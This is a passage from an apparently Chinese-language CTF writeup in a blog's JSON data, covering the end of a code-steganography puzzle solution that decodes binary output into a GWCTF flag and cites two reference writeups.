class=\"string\">&quot;malloc.c&quot;</span>)</span><br></pre></td></tr></table></figure>\n<p>得到了输出，是一串二进制：<br>![](/images/Writeup/20210831185047.png]<br>解码，得到flag。<br>flag:<del>GWCTF{code_steganography_1s_funny!}</del><br><em>网络上的示例脚本有点问题，我改又改不好。。</em><br><em>记得改提交格式</em></p>\n<hr>\n<p>参考：<br>1.<a href=\"https://blog.csdn.net/weixin_46676743/article/details/112392181\">2020羊城杯CTF随缘Writeup</a><br>2.<a href=\"https://blog.csdn.net/weixin_45696568/article/details/116714191\">BUUCTF MISC刷题笔记(六)</a></p>\n","categories":["Misc","图片隐写"]}]